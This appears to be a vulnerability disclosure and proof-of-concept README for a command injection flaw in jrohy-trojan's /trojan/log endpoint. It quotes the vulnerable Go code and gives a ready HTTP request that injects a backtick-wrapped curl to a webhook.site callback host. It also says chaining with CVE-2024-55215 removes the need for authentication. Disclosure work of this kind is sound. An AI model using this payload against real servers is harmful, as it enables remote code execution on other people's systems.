# Jrohy-trojan-RCE-POC

Vulnerability Type: Command Injection (Remote Code Execution - RCE)

Affected Component: jrohy-trojan Web Interface /trojan/log Endpoint

Impact: Remote attackers can execute arbitrary commands on the server with the privileges of the web service.

web/web.go Line 102:
```go
router.GET("/trojan/log", func(c *gin.Context) {
		controller.Log(c)
	})
```
trojan/web/controller/trojan.go Line 72:
```go
func Log(c *gin.Context) {
	var (
		wsConn *util.WsConnection
		err    error
	)
	if wsConn, err = util.InitWebsocket(c.Writer, c.Request); err != nil {
		fmt.Println(err)
		return
	}
	defer wsConn.WsClose()
	param := c.DefaultQuery("line", "300")
	if !util.IsInteger(param) {
		fmt.Println("invalid param: " + param)
		return
	}
	if param == "-1" {
		param = "--no-tail"
	} else {
		param = "-n " + param
	}
	result, err := util.LogChan("trojan", param, wsConn.CloseChan) //Here is the trigger
	if err != nil {
		fmt.Println(err)
		return
	}
	for line := range result {
		if err := wsConn.WsWrite(ws.TextMessage, []byte(line+"\n")); err != nil {
			fmt.Println("can't send: ", line)
			break
		}
	}
}
```

trojan/util/linux.go Line 98:
```go
func LogChan(serviceName, param string, closeChan chan byte) (chan string, error) {
	cmd := exec.Command("bash", "-c", fmt.Sprintf("journalctl -f -u %s -o cat %s", serviceName, param))

	stdout, _ := cmd.StdoutPipe()

	if err := cmd.Start(); err != nil {
		fmt.Println("Error:The command is err: ", err.Error())
		return nil, err
	}
	ch := make(chan string, 100)
	stdoutScan := bufio.NewScanner(stdout)
	go func() {
		for stdoutScan.Scan() {
			select {
			case <-closeChan:
				stdout.Close()
				return
			default:
				ch <- stdoutScan.Text()
			}
		}
	}()
	return ch, nil
}
```
Root Cause:

The line parameter in the /trojan/log endpoint is directly concatenated into a shell command without proper sanitization:

```go
cmd := exec.Command("bash", "-c", fmt.Sprintf("journalctl -f -u %s -o cat %s", serviceName, param))
The param variable is derived from user input (c.DefaultQuery("line", "300")) and allows injection via backticks (`) or shell metacharacters (e.g., ;, &, |).
```

POC:
```HTTP
GET /trojan/log?line=1%60curl%20https://webhook.site/xxxxxx%60&token=eyJhbGciOiJIUzI1NiIsxxxxxx.xxx.xxxS2h70jlP0psVzY7DBNLAlOgg HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: key
Sec-WebSocket-Protocol: websocket
Connection: Upgrade
Upgrade: websocket

```

With the use of CVE-2024-55215, there is no authentication needed to exploit this vulnerability.
POC Details can be found in POC.py
